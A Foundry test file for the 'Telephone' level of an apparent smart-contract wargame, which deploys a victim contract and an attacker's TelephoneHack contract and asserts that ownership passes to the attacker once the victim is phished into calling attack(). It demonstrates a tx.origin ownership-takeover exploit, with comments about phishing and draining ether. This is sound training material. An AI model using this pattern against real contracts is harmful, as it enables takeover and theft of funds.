// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import "../04_Telephone/Telephone.sol";
import "../04_Telephone/TelephoneHack.sol";

contract TelephoneTest is Test {
    Telephone public telephone;
    TelephoneHack public attackerContract;
    address public victim;
    address public attacker;

    function setUp() public {
        victim = makeAddr("victim");
        attacker = makeAddr("player");
        vm.startPrank(victim);
        telephone = new Telephone();
        vm.stopPrank();
    }

    function test_exploit() public {
        assertEq(telephone.owner(), victim, "Owner should be the victim");

        // Attacker deploys his (hacking) contract first
        vm.startPrank(attacker);
        attackerContract = new TelephoneHack(address(telephone));
        assertEq(attackerContract.owner(), attacker, "Owner should be the attacker");
        vm.stopPrank();
        console.log("Owner of Telephone contract before exploit:", telephone.owner());

        // Attacker somehow phish (convince) the victim to call the attack function
        vm.startPrank(victim);
        attackerContract.attack(attacker);
        assertEq(telephone.owner(), attacker, "Telephone Owner not changed to attacker");
        vm.stopPrank();
        console.log("Owner of Telephone contract after exploit:", telephone.owner());
        // Attacker drains the Telephone contract if it had any ether
    }
}